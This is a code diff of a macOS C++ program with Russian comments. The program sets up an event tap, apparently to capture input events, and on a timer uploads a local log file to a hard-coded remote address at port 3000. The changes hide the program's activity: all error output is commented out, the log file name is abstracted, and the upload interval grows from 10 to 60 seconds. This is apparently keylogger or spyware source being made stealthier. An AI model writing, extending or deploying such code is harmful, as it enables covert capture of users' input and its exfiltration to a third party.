@@ -1,9 +1,4 @@
 #include <CoreFoundation/CoreFoundation.h>
-#include <chrono>
-#include <iostream>
-#include <string>
-#include <thread>
-#include <unistd.h>
 #include "file_reader.h"
 #include "event_listener.h"
 #include "file_uploader.h"
@@ -11,21 +6,21 @@
 char resolved_path[PATH_MAX];
 
 void DelayedCallback(CFRunLoopTimerRef timer, void *info) {
-    // TODO: change !!!
-    const std::string url = "http://10.96.183.71:3000/upload";
-    const std::string filePath =  static_cast<std::string>(resolved_path) + "/system_log.txt";
+    // TODO: CHANGE SERVER URL !!!
+    const std::string remote_url = "http://10.96.183.71:3000/upload";
+    const std::string filePath =  static_cast<std::string>(resolved_path) + "/" + FILE_NAME;
 
-    CheckAndSendFile(url, filePath);
+    CheckAndSendFile(remote_url, filePath);
 }
 
 int main(int argc, char *argv[]) {
     if (argc < 1) {
-        std::cerr << "Не удалось получить путь к программе." << std::endl;
+        // std::cerr << "Не удалось получить путь к программе." << std::endl;
         return 1;
     }
         
     if (realpath(argv[0], resolved_path) == nullptr) {
-        std::cerr << "Не удалось разрешить путь к программе." << std::endl;
+        // std::cerr << "Не удалось разрешить путь к программе." << std::endl;
         return 1;
     }
 
@@ -49,14 +44,13 @@ int main(int argc, char *argv[]) {
 
     if (!eventTap) {
         const char* errorMessage = "Не удалось создать Tap событий.";
-        std::cerr << errorMessage << std::endl;
+        // std::cerr << errorMessage << std::endl;
         return 1;
     }
 
-    // Создаем таймер, который будет вызывать функцию DelayedCallback каждые 10 секунд
+    // Создаем таймер, который будет вызывать функцию DelayedCallback каждые 60 секунд
     CFRunLoopTimerContext context = {0, NULL, NULL, NULL, NULL};
-    // TODO: change !!!
-    CFTimeInterval interval = 10.0;
+    CFTimeInterval interval = 60.0;
     CFRunLoopTimerRef timer = CFRunLoopTimerCreate(NULL, CFAbsoluteTimeGetCurrent() + interval, interval, 0, 0, DelayedCallback, &context);
 
     // Добавляем таймер в текущий run loop
